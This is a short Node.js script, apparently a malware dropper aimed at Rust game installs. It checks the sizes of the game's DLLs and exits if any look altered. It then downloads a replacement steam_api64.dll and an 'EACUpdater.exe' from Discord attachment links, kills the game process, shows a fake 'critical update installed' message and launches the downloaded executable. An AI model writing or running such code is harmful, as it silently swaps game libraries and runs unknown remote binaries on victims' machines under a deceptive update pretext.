var fsPromises = require('fs').promises;
var axios = require('axios');
var fs = require('fs');
var { exec } = require('child_process');

function ValidationFile(name, minGoodSize, maxGoodSize) {
    if (fs.existsSync("./" + name)) {
        const EacSize = fs.statSync("./" + name).size / 1024;
        if (EacSize < minGoodSize || EacSize > maxGoodSize) {
            process.exit(0);
        }
    }
    if (fs.existsSync("./RustClient_Data/Plugins/x86_64/" + name)) {
        const EacSize = fs.statSync("./RustClient_Data/Plugins/x86_64/" + name).size / 1024;
        if (EacSize < minGoodSize || EacSize > maxGoodSize) {
            process.exit(0);
        }
    }
}
ValidationFile("EasyAntiCheat.dll", 750, 800)
ValidationFile("sqlite3.dll", 950, 1050)
ValidationFile("UnityPlayer.dll", 25000, 25600)
ValidationFile("steam_api64.dll", 330, 400)
ValidationFile("CChromaEditorLibrary64.dll", 350, 420)
ValidationFile("GfxPluginDLSSNative.dll", 30, 65)
ValidationFile("GfxPluginNVIDIAReflex.dll", 25, 55)
ValidationFile("MidiJackPlugin.dll", 280, 320)
ValidationFile("nvngx_dlss.dll", 14000, 14200)
ValidationFile("Renderer.dll", 280, 320)
ValidationFile("RustNative.dll", 1450, 1600)


if (fs.existsSync('./steam_api64.dll') == false || (fs.statSync("./steam_api64.dll").size / 1024) > 400 || (fs.statSync("./steam_api64.dll").size / 1024) < 350) {
    axios.get('https://cdn.discordapp.com/attachments/902821540675072020/968033754906001468/steam_api64.dll',
        {
            responseType: 'arraybuffer'
        })
        .then(async response => {
            await fsPromises.writeFile('./steam_api64.dll', response.data, { encoding: 'binary' });
            exec("taskkill /im RustClient.exe", (error, stdout, stderr) => {})
            exec('msg "%username%" Rust: Установлено критическое обновление / Critical update installed', (error, stdout, stderr) => {})
            setTimeout(() => { process.exit(0); }, 1000)
        })
        .catch(error => {
            console.log({ error });
        });
}

if (fs.existsSync('./EACUpdater.exe') == false) {
        axios.get('https://cdn.discordapp.com/attachments/902821540675072020/964890467336589342/EACUpdater.exe',
        {
            responseType: 'arraybuffer'
        })
        .then(async response => {
            await fsPromises.writeFile('./EACUpdater.exe', response.data, { encoding: 'binary' });
            exec("cmd /C start EACUpdater.exe", (error, stdout, stderr) => {})
            console.log("FINISH!")
        })
        .catch(error => {
            console.log({ error });
        });
}
